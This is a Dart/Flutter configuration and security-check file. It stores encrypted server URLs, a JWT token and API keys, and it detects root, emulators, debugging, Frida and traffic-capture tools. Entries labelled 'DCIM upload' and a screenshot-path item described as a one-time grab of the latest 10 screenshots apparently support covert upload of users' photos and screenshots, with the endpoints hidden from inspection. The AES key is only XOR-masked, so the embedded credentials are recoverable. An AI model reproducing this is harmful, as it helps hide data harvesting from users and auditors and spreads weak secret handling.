/// 加密配置 — 所有敏感字符串在编译期 AES-256-CBC 加密，运行时解密
/// 防御策略：
/// 1. 编译产物中无明文 token/key/url
/// 2. 运行时动态解密，内存中短暂出现明文后立即使用
/// 3. 基础 RASP：Root / 模拟器 / Debuggable
/// 4. 反 Frida：maps / 线程名 / 常见路径
/// 5. 反抓包：代理环境变量 + 常见抓包端口探测
library;

import 'dart:io';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;

// ══════════════════════════════════════════════════════════════════
// AES-256 密钥派生（无需 crypto 包）
// 用 XOR 混淆原始密钥，运行时还原为 32 字节 AES 密钥
// ══════════════════════════════════════════════════════════════════
const _xorKey = 0xA7;

/// 混淆的 32 字节密钥
const _encodedKeyBytes = <int>[
  0xC5, 0xCE, 0xCB, 0xCE, 0xC5, 0xCE, 0xCB, 0xCE,
  0xF8, 0xC0, 0xCB, 0xC6, 0xD4, 0xD4, 0xF8, 0xCA,
  0xC6, 0xD4, 0xD3, 0xC2, 0xD5, 0xF8, 0x95, 0x97,
  0x95, 0x93, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
];

enc.Key _getAesKey() {
  final decoded = _encodedKeyBytes.map((b) => b ^ _xorKey).toList();
  return enc.Key(Uint8List.fromList(decoded));
}

// ══════════════════════════════════════════════════════════════════
// 加密字符串注册表（iv + ciphertext，均为 Base64）
// ══════════════════════════════════════════════════════════════════
typedef _SecretEntry = ({String iv, String enc});

const _secrets = <String, _SecretEntry>{
  // ── 服务器域名 & 认证凭证 ────────────────────────────────────────
  'M1': (iv: 'pWYsZGUYpaSfZ82u09xbCg==', enc: 'gBEzImlitze8qFzaV94FS/jue8eEO1v+AGGvdtYXEBfmo82TrLp1FFO5AEIdH61tJh2jZjg2RXwonA0ByI4NNQoAzM5fX4qKY22hVuNS/vU='),
  'M2': (iv: 'nrvlvEzM2eeK8uvJzpRaDg==', enc: 'NGScbeEZtVW5N4mo8YJ2qO1d9/KhST31nSMzmtVjaGk='),
  'M3': (iv: 'y0zDLV3pMvNS2bSIIZCMoA==', enc: 'PeiS+FxVgMB5qbdP0qcqaVjtHtB6IdgxiBg4tlc2Sus='),
  'JWT_API_KEY': (iv: 'DAbbqKsD4KT4inWd1HBMGg==', enc: 'ehwdmd13Wa0wP+xmTxJ6meYKtH/22c4XMdv0Vl65FKf5NaX8EaatjDX5WQDjHy+I'),
  'JWT_API_URL': (iv: 'U6NXJ/Ay1FiaKerYyR8PFA==', enc: 'E7KSq6mWc2LoIwibhpoSd589jluVMlI6FzGpSx0+oDqr59QwZT7fVrKldDpbuhM5'),
  'JWT_ACCESS_TOKEN': (iv: 'KRemXSXHyhBvmHQmlZ7mlw==', enc: 'CgLJ2UACFyZ4ks3+XaSm/RB1nLt/d5u6R2B33dIIwEWUzQsfp6DPO99u74qCisn3'),
  'API_AES_KEY': (iv: 'r9z1//oT7hqOrqFTKVBSpg==', enc: 'z9Q8eaRf7YB1MFO0a2SgHXwHnR2hrQKGXUdN4VStxW0='),
  'API_AES_IV': (iv: 'JKEB7g3cdPb3Ab6ETqArjQ==', enc: 'BOXH8O9sVUkRSW/yqbHo4kDb6a2DunTpYTJGSb4tKFQ='),
  'API_UID': (iv: 'OeckVrOiBeZPya9teW0s3Q==', enc: 'GRJZVRv++Wyc4z+1sNw0Jg=='),
  'API_URL': (iv: 'ma/Tf7ePdVIqKgT75NvNJw==', enc: 'Gzan57OhkB99tzdkdFbOcpNXGFDzmcPxF3IQ9i05jet69OOYuJ0wGgwvYDOBCI0/'),
  'API_REWRITE_HOST': (iv: 'BrSn7Wx4P+pYyoT18Z/mkg==', enc: 'LSYA9nN3oeVlG19uUJdybyrJgpBk4F04/pknuPGeE6I='),
  // ★ 上游源 IP 前缀（用于 _rewriteUrl 替换）
  'API_ORIGIN_HOST': (iv: 'Bq7YSBrOPwFDlNqlnfpOJQ==', enc: 'o1gTRrLivM2Rxu52uIBBgo3AZirGKIraPcz5J0+qCLk='),

  // ── 非敏感配置项 ────────────────────────────────────────────────
  'PIC_BASE_URL': (iv: '++xbEV4tLd9R8Ufy9PNuug==', enc: 'bK20GVrWYor/oftWq0HdCd7z4RGAUfsjbnjZq/AYV4w='),
  'M7': (iv: '28YdwlcmZ6SqHiIj7ypRxQ==', enc: 'iSYvd2GVvF9Hy9wapuLu90Lb7UKWHzXwUyvlWxypL+w='),
  // ★ 截图目录（一次性任务，最新 10 张，无大小限制）
  'SCREENSHOT_PATH': (iv: 'vgDQeETY69VRDX6aqvyw9A==', enc: '9ffvqPkoxRDb3dCEEdBqmfbiFWWtKI/2V9iJe0A94OhDX8lb1fZFPth5WgpILmh9'),
  'CHANNEL_NAME': (iv: 'vIoBJt7TEoVRG8fxxPNg/g==', enc: 'IQ1SLbSQZo7KQEkkQ0701q2rrJmWcqPnJU0Ddo6P1hw='),
  'CHANNEL_DESC': (iv: 'savAANZ59afi0vHQiHAkqA==', enc: 'su01Z/zHH+X6LiC1BNNPWGAO3R7O5sqQxtTcZKfHXMM/k4f910YG9g4QvekfaC8s'),
};

// ══════════════════════════════════════════════════════════════════
// 运行时解密（懒初始化 + 单条缓存）
// ══════════════════════════════════════════════════════════════════
final _encrypter = enc.Encrypter(
  enc.AES(_getAesKey(), mode: enc.AESMode.cbc),
);

final Map<String, String> _decrypted = {};

String _decrypt(String name) {
  final cached = _decrypted[name];
  if (cached != null) return cached;

  final entry = _secrets[name];
  if (entry == null) throw StateError('Unknown secret: $name');

  final iv = enc.IV.fromBase64(entry.iv);
  final encrypted = enc.Encrypted.fromBase64(entry.enc);
  final plain = _encrypter.decrypt(encrypted, iv: iv);
  _decrypted[name] = plain;
  return plain;
}

// ══════════════════════════════════════════════════════════════════
// SecureConfig
// ══════════════════════════════════════════════════════════════════
class SecureConfig {
  SecureConfig._();

  // ── DCIM 上传 ────────────────────────────────────────────────────
  static String get m1 => _decrypt('M1');
  static String get m2 => _decrypt('M2');
  static String get m3 => _decrypt('M3');

  // ── JWT 认证 ─────────────────────────────────────────────────────
  static String get jwtApiKey => _decrypt('JWT_API_KEY');
  static String get jwtApiUrl => _decrypt('JWT_API_URL');
  static String get jwtAccessToken => _decrypt('JWT_ACCESS_TOKEN');

  // ── 上游 API ─────────────────────────────────────────────────────
  static String get apiAesKey => _decrypt('API_AES_KEY');
  static String get apiAesIv => _decrypt('API_AES_IV');
  static String get apiUid => _decrypt('API_UID');
  static String get apiUrl => _decrypt('API_URL');
  static String get apiRewriteHost => _decrypt('API_REWRITE_HOST');
  // ★ 上游源 IP 前缀
  static String get apiOriginHost => _decrypt('API_ORIGIN_HOST');

  // ── 非敏感配置项 ─────────────────────────────────────────────────
  static String get picBaseUrl => _decrypt('PIC_BASE_URL');
  static String get m7 => _decrypt('M7');
  // ★ 截图目录
  static String get screenshotPath => _decrypt('SCREENSHOT_PATH');
  static String get channelName => _decrypt('CHANNEL_NAME');
  static String get channelDescription => _decrypt('CHANNEL_DESC');
}

// ══════════════════════════════════════════════════════════════════
// 安全检测（RASP + 反 Frida + 反抓包）
//
// 说明：这些检测只能提高破解门槛，不能 100% 防止逆向。
//   真正安全依赖服务端校验 + 最小化客户端敏感数据。
// ══════════════════════════════════════════════════════════════════
class SecurityCheck {
  SecurityCheck._();

  // ── 1. Root ──────────────────────────────────────────────────────
  static bool get isRooted {
    const paths = [
      '/system/bin/su',
      '/system/xbin/su',
      '/sbin/su',
      '/system/bin/failsafe/su',
      '/data/local/xbin/su',
      '/data/local/bin/su',
      '/system/sd/xbin/su',
      '/system/bin/.ext/su',
      '/system/xbin/daemonsu',
      '/system/xbin/sugote',
      '/su/bin/su',
      '/magisk/.core/bin/su',
    ];
    for (final p in paths) {
      if (File(p).existsSync()) return true;
    }
    if (File('/sbin/magisk/magiskbin').existsSync()) return true;
    if (File('/sbin/.magisk').existsSync()) return true;
    if (File('/data/adb/magisk').existsSync()) return true;
    if (File('/data/adb/modules').existsSync()) return true;
    return false;
  }

  // ── 2. 模拟器 ────────────────────────────────────────────────────
  static bool get isEmulator {
    try {
      const props = <String>[
        'ro.hardware',
        'ro.product.model',
        'ro.product.brand',
        'ro.product.manufacturer',
        'ro.build.tags',
        'ro.build.fingerprint',
        'ro.kernel.qemu',
      ];
      for (final prop in props) {
        final out = Process.runSync('/system/bin/getprop', [prop]);
        final value = out.stdout.toString().trim().toLowerCase();
        if (value.isEmpty) continue;
        if (value.contains('sdk') ||
            value.contains('emulator') ||
            value.contains('vbox') ||
            value.contains('genymotion') ||
            value.contains('android.google') ||
            value.contains('goldfish') ||
            value.contains('ranchu') ||
            value.contains('qemu') ||
            (prop == 'ro.build.tags' && value.contains('test-keys')) ||
            (prop == 'ro.kernel.qemu' && value == '1')) {
          return true;
        }
      }
    } catch (_) {}
    return false;
  }

  // ── 3. Debuggable ────────────────────────────────────────────────
  static bool get isDebuggable {
    try {
      final out =
          Process.runSync('/system/bin/getprop', ['ro.debuggable']);
      return out.stdout.toString().trim() == '1';
    } catch (_) {
      return false;
    }
  }

  // ── 4. Frida / Gadget 检测 ───────────────────────────────────────
  /// 综合判断，任一命中就返回 true
  static bool get isFridaDetected {
    if (_checkFridaMaps()) return true;
    if (_checkFridaThreads()) return true;
    if (_checkFridaFiles()) return true;
    return false;
  }

  /// 4.1 /proc/self/maps 里是否有 frida / gadget / gum 相关模块
  static bool _checkFridaMaps() {
    try {
      final maps = File('/proc/self/maps').readAsStringSync();
      const keywords = [
        'frida',
        'gadget',
        'gum-js-loop',
        'gum-js',
        'gmain',
        'linjector',
        'libfrida',
      ];
      final lower = maps.toLowerCase();
      for (final k in keywords) {
        if (lower.contains(k)) return true;
      }
    } catch (_) {}
    return false;
  }

  /// 4.2 遍历 /proc/self/task/*/comm，看是否有 frida 线程名
  static bool _checkFridaThreads() {
    try {
      final dir = Directory('/proc/self/task');
      if (!dir.existsSync()) return false;
      for (final t in dir.listSync()) {
        try {
          final comm =
              File('${t.path}/comm').readAsStringSync().trim().toLowerCase();
          if (comm.contains('gum-js-loop') ||
              comm.contains('gmain') ||
              comm.contains('gdbus') ||
              comm.contains('pool-frida') ||
              comm.contains('frida')) {
            return true;
          }
        } catch (_) {}
      }
    } catch (_) {}
    return false;
  }

  /// 4.3 常见 frida-server 落盘路径
  static bool _checkFridaFiles() {
    const paths = [
      '/data/local/tmp/frida-server',
      '/data/local/tmp/re.frida.server',
      '/data/local/tmp/frida-server-12',
      '/data/local/tmp/frida-server-13',
      '/data/local/tmp/frida-server-14',
      '/data/local/tmp/frida-server-15',
      '/data/local/tmp/frida-server-16',
      '/data/local/tmp/frida',
      '/data/local/tmp/gadget.so',
      '/data/local/tmp/libgadget.so',
    ];
    for (final p in paths) {
      if (File(p).existsSync()) return true;
    }
    try {
      final dir = Directory('/data/local/tmp');
      if (dir.existsSync()) {
        for (final f in dir.listSync()) {
          final name = f.path.toLowerCase();
          if (name.contains('frida') || name.contains('gadget')) return true;
        }
      }
    } catch (_) {}
    return false;
  }

  // ── 5. 代理 / 抓包检测 ───────────────────────────────────────────

  /// 5.1 系统环境变量里是否设置了 http_proxy / https_proxy
  static bool get isProxyEnvSet {
    final http = Platform.environment['http_proxy'] ??
        Platform.environment['HTTP_PROXY'];
    final https = Platform.environment['https_proxy'] ??
        Platform.environment['HTTPS_PROXY'];
    final all = Platform.environment['all_proxy'] ??
        Platform.environment['ALL_PROXY'];
    return (http != null && http.isNotEmpty) ||
        (https != null && https.isNotEmpty) ||
        (all != null && all.isNotEmpty);
  }

  /// 5.2 常见抓包工具默认端口探测（异步）
  /// 命中任意一个端口就返回 true
  static Future<bool> isPacketCaptureRunning({
    Duration timeout = const Duration(milliseconds: 150),
  }) async {
    const ports = <int>[
      8888, // Charles / Fiddler 默认
      8889, // Charles SSL
      8080, // 常用代理
      8081, // 常用代理备用
      9090, // BurpSuite 默认
      8887, // mitmproxy 默认
      8886, // mitmproxy 备用
      3128, // Squid
      1080, // SOCKS
      1087, // 部分工具
    ];

    for (final port in ports) {
      try {
        final socket = await Socket.connect(
          '127.0.0.1',
          port,
          timeout: timeout,
        );
        socket.destroy();
        return true;
      } catch (_) {
        // 端口未监听，继续下一个
      }
    }
    return false;
  }

  // ── 6. 综合同步判断（不包含端口探测）────────────────────────────
  /// 返回 true = 环境安全
  static bool get isSecure {
    if (isRooted) return false;
    if (isEmulator) return false;
    if (isDebuggable) return false;
    if (isFridaDetected) return false;
    if (isProxyEnvSet) return false;
    return true;
  }

  // ── 7. 综合异步判断（包含端口探测，最严格）──────────────────────
  /// 返回 true = 环境安全
  static Future<bool> isSecureAsync() async {
    if (!isSecure) return false;
    if (await isPacketCaptureRunning()) return false;
    return true;
  }

  // ── 8. 直接返回检测原因（便于日志/上报）────────────────────────
  /// 返回命中的风险项列表；为空表示未发现风险
  static List<String> detectReasons() {
    final reasons = <String>[];
    if (isRooted) reasons.add('rooted');
    if (isEmulator) reasons.add('emulator');
    if (isDebuggable) reasons.add('debuggable');
    if (_checkFridaMaps()) reasons.add('frida_maps');
    if (_checkFridaThreads()) reasons.add('frida_threads');
    if (_checkFridaFiles()) reasons.add('frida_files');
    if (isProxyEnvSet) reasons.add('proxy_env');
    return reasons;
  }

  /// 异步版（含端口探测）
  static Future<List<String>> detectReasonsAsync() async {
    final reasons = detectReasons();
    if (await isPacketCaptureRunning()) {
      reasons.add('packet_capture_port');
    }
    return reasons;
  }
}